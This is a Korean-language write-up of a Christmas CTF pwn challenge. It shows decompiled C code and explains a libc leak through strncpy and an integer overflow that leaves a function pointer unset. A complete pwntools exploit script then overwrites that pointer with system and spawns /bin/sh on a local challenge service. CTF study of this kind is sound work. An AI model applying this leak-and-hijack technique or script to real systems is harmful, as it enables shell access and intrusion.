---
title: Chrismas CTF Match_Maker write up
categories: [2021, Chrismas, new]
tags: [CTF, linux , uaf, baby]
---

Chrismas CTF Oil system write up

이번 크리스마스 CTF 문제가 나쁘지 않다고 들어서 pwn문제를 기준으로 쭈욱 풀었다.

# analyze

``` c++
unsigned __int64 __fastcall sub_1C0D(char *a1)
{
  char buf[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v3; // [rsp+38h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("name: ");
  read(0, buf, 0x1FuLL);
  strncpy(a1, buf, 0x1FuLL);
  return __readfsqword(0x28u) ^ v3;
}
```

   프로파일을 만드는 과정에서 name을 입력받는 부분이 strncpy로 되어 있어 leak이 가능하다.

``` c++
__int64 __fastcall sub_1CE2(__int64 a1)
{
  __int64 result; // rax
  __int64 v2; // rdx

  if ( *(_DWORD *)(a1 + 0x2C) + *(_DWORD *)(a1 + 0x30) )
  {
    v2 = (__int64)sub_1C82(a1);
    result = a1;
    *(_QWORD *)(a1 + 0x20) = v2;
  }

```

  profile에 함수를 넣는 부분이다. sub_1C82(a1); 의 return값이 들어간다는 것을 확인 할 수 있다.

``` c++
__int64 (__fastcall *__fastcall sub_1C82(__int64 a1))()
{
  int v2; // [rsp+8h] [rbp-10h]
  int v3; // [rsp+Ch] [rbp-Ch]
  __int64 (__fastcall *v4)(); // [rsp+10h] [rbp-8h]

  v2 = *(_DWORD *)(a1 + 0x2C) * *(_DWORD *)(a1 + 0x2C);
  v3 = *(_DWORD *)(a1 + 0x30) * *(_DWORD *)(a1 + 0x30);
  if ( v2 > v3 )
    v4 = (__int64 (__fastcall *)())sub_1630;
  if ( v3 > v2 )
    v4 = (__int64 (__fastcall *)())sub_1486;
  return v4;
}
```
  내부를 보면 v2와 v3에 따라서 v4가 정해지는데, v2와 v3를 같을 경우를 생각하지 않았다. 곱셈하는 과정에서 인티져 오버플로우를 생각하여 계산하면
  v2 == v3인 경우를 만들 수 있다.

  v4에 system함수를 리턴시켜 system("/bin/sh")를 실행시킨다.


# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

host = "localhost"
port = 4000

def menu(index):
    s.recvuntil("> ")
    s.sendline(str(int(index)))

def sen(payload):
    s.recvuntil(": ")
    s.sendline(str(payload))

def makeProfile(age, name, minage, maxage, sex, hobby1, hobby2, hobby3):
    menu(0)
    sen(age)
    s.recvuntil(": ")
    s.send(name)
    sen(minage)
    sen(maxage)
    menu(sex)
    sen(hobby1)
    sen(hobby2)
    sen(hobby3)

if __name__ == "__main__":
    s = remote(host, port)

    makeProfile(20, "AAAAAAA\n", 20, 20, 1, "qwe123", "qwe123", "qwe123")
    menu(3)
    s.recvuntil("AAAAAAA\n")

    libc_base = u64(s.recvuntil("\n")[:-1].ljust(8, b"\x00")) - 0x94013
    system_addr = libc_base + 0x55410

    log.info("libc_base       : " +str(hex(libc_base)))
    log.info("system_addr     : " +str(hex(system_addr)))

    makeProfile(20, b"/bin/sh\x00"*2 + p64(system_addr), 20, 67108884, 1, "qwe123", "qwe123", "qwe123")

    menu(2)
    s.sendline("id")
    s.interactive()
```
